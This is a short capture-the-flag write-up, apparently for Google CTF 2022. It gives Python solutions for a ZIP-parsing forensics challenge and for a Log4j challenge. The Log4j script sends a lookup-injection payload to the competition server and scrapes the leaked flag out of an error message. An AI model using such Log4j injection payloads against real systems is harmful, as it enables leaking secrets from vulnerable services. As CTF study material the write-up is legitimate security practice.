## APPNOTE.TXT
```python
from struct import unpack

data = open("dump.zip", "rb").read()

for i in range(len(data) - 3):
  sig = unpack("<I", data[i:i+4])[0]
  if sig == 0x06054b50:
    sig, this, disk, num_cd, tot_cd, sz_cd, off_cd, comlen = unpack("<IHHHHIIH", data[i:i+22])
    com = data[i+22:i+22+comlen]
    i = off_cd
    sig = unpack("<I", data[i:i+4])[0]
    if sig == 0x02014b50:
      fnamelen = unpack("<H", data[i+28:i+30])[0]
      rel_off = unpack("<I", data[i+42:i+46])[0]
      fname = data[i+46:i+46+fnamelen]
      i = rel_off
      sig = unpack("<I", data[i:i+4])[0]
      if sig == 0x04034b50:
        fnamelen = unpack("<H", data[i+26:i+28])[0]
        extralen = unpack("<H", data[i+28:i+30])[0]
        fname2 = data[i+30:i+30+fnamelen]
        comprlen = unpack("<I", data[i+18:i+22])[0]
        compr = data[i+30+extralen+fnamelen:i+30+extralen+fnamelen+comprlen]
        print("%s" % (compr.decode()), end="")
```
### Another Solution
```python
#!/usr/bin/env python3

from os import system

with open('dump.zip', 'rb') as f: zf = f.read()[::-1]

while True:

    zfnew = zf.replace(b'\x06\x05\x4b\x50', b'\0\0\0\0', 1)
    if zfnew == zf: break
    zf = zfnew
    with open('dump-ed.zip', 'wb') as f: f.write(zf[::-1])
    system('unzip -o dump-ed.zip >/dev/null 2>&1')

system('cat flag*')
print()
```
## Log4j
```python
import requests
import re

URL = "https://log4j-web.2022.ctfcompetition.com/"

payload = "${java:${java:FLAG}}"
r = requests.post(URL, data={"text": payload})
output = re.search(r"(?<=to lookup java:).*(?=java.lang.IllegalArgumentException:)", r.text)
print(output.group(0))
```
### Referensi
#log4j
- https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution
- https://book.hacktricks.xyz/pentesting-web/deserialization/jndi-java-naming-and-directory-interface-and-log4shell
- https://github.com/FarhadAlimohammadi-dir/Google-CTF-2022-Writeups
- https://www.youtube.com/watch?v=0-abhd-CLwQ